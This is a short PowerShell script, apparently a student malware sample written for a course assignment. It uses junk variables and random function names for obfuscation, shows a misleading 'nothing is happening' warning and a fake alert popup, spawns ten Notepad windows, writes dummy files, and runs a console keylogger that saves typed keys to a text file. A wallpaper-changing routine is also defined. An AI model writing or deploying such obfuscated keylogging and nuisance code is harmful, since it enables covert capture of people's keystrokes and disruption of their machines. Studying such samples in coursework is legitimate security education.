# Random useless variables and junk for obfuscation
$X9k = [System.Guid]::NewGuid().ToString()
$Z3p = [System.IO.Path]::GetRandomFileName()
$M7v = 10000
$N1t = [System.Security.Cryptography.RandomNumberGenerator]::Create()

function ZzR {
    $oG7 = New-Object -ComObject Wscript.Shell
    $N4d = $oG7.Popup("Alert! But nothing happens.", 0, "Warning")
    $N4d
}

function Q6L {
    $aP3g = $true
    $sV6j = [System.Collections.ArrayList]::new()
    while ($aP3g) {
        $gX8r = [System.Console]::ReadKey($true)
        if ($gX8r.Key -eq [System.ConsoleKey]::Escape){
            $aP3g = $false
        }
        $sV6j.Add($gX8r.keychar)
    }
    New-Item -ItemType File -Path "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1\copiedkeys[10].txt" -Value $($sV6j -join '')
}

function H6L {
    $U2p = 0
    while ($U2p -lt 10) {
        Start-Process -FilePath "notepad.exe"
        $U2p++
    }
}
function T3m {
    $R9c = "HKCU:Control Panel\Desktop"
    $Z4h = "WallPaper"
    $P2q = "some_random_image.png"
    set-itemproperty -path $R9c -name $Z4h -value $P2q
}

function Y3J {
    $T4p = 0
    while ($T4p -lt 10) {
        $X6y = "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1"
        $F9q = "\copiedkeys[$T4p].txt"
        New-Item -ItemType File -Path "$X6y\$F9q" -Value "Some random text"
        $T4p++
    }
}

Write-Warning "Warning Nothing is happening"

Start-Process powershell

ZzR
H6L
Y3J
Q6L
